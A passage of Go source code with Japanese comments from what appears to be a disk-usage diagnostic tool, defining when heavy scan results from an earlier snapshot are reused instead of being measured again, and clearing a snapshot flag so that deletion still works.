		r.FromSnapshot = true // 走査していない印 (④ の削除は必ず再スキャンを通す)
		out = append(out, r)
	}
	return out
}

// 重いエントリの再利用 (ユーザー要望 2026-09-02: スキャンはディスク I/O を食うので、明らかに重いものを何度も
// 測り直さない)。前回の計測に doctorHeavyElapsed 以上かかったエントリは、計測から doctorHeavyReuseTTL 以内なら
// 走査せず前回の値を出す (行に「前回の計測を再利用」と添える)。r は全部測り直す。
// 軽いエントリ (数十 ms) は毎回測る: 再利用しても得るものが無く、古い値を出す損だけが残る。
const (
	doctorHeavyElapsed  = 2 * time.Second
	doctorHeavyReuseTTL = time.Hour
)

// doctorReuseFrom は snapshot から「再利用してよい前回結果」を返す関数を作る (disk.Options.Reuse 用)。
// 対象は Status ok で、走査に成功したもの (failed / blocked / partial は毎回測り直す)。
func doctorReuseFrom(sn doctorSnapshot, ok bool, now time.Time) func(disk.Entry) *disk.Result {
	if !ok || sn.Disk.Partial {
		return nil
	}
	byID := map[string]disk.Result{}
	for _, r := range sn.Disk.Results {
		if r.Status != disk.StatusOK || r.Elapsed < doctorHeavyElapsed || r.MeasuredAt.IsZero() {
			continue
		}
		if age := now.Sub(r.MeasuredAt); age < 0 || age >= doctorHeavyReuseTTL {
			continue
		}
		byID[r.Entry.ID] = r
	}
	if len(byID) == 0 {
		return nil
	}
	return func(e disk.Entry) *disk.Result {
		if r, ok := byID[e.ID]; ok {
			r.Entry = e // 表示文言はカタログの今の定義に合わせる (計測値だけを再利用)
			// 🚨 **FromSnapshot は落とす**。再利用は「前回の計測値を引き継いだ」(= Reused) で
			// あって「画面ごと復元した」ではない。残すと、今回走査した画面なのに削除が
			// 「前回の結果を表示しています」と断り、しかも snapshotAt は zero なので
			// 再スキャンにも倒れない = その行だけ行き止まりになる (敵対レビュー 2026-09-03 が実測)
			r.FromSnapshot = false
			return &r
		}
		return nil
	}
}
